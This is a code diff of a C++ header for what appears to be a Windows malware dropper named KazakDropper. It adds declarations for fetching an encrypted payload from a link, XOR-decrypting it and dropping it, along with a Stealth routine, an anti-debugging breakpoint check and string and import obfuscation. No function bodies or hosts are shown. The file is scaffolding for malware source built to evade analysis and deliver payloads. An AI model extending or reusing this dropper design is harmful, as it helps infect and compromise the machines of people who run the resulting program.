@@ -6,17 +6,23 @@
 #include <filesystem>
 #include <thread>
 #include <WinInet.h>
+#include <TlHelp32.h>
+#include <Windows.h>
+#include <cstdio>
+#include <fstream>
+
 
 #include "../headers/obfuscation/li.h"
-#include "../headers/obfuscation/xor.h"
+#include "obfuscation/xor.h"
 
 #pragma comment(lib,"WinInet.lib")
 
 struct Storage
 {
-	std::string DecryptedBytes;
-	std::string BytesStorage;
-	std::string Key;
+	std::string PayloadLink;
+	std::string EncryptedPayload;
+	std::string DecryptedPayload;
+	std::string XorKey;
 
 };
 
@@ -26,10 +32,13 @@ namespace KazakDropper
 	BOOL IsBp(const char* lpszModule, const char* lpszFunction);
 
 	void Stealth();
-	void PrepareExe();
+	void PreparePayload();
+
+	void DropPayload(std::string payload);
 }
 
 namespace KazakUtils
 {
-	std::string FileToString(std::wstring URL);
+	std::string replace_all(std::string subject, const std::string& search, const std::string& replace);
+	std::string StringWrapper(const std::string url);
 }
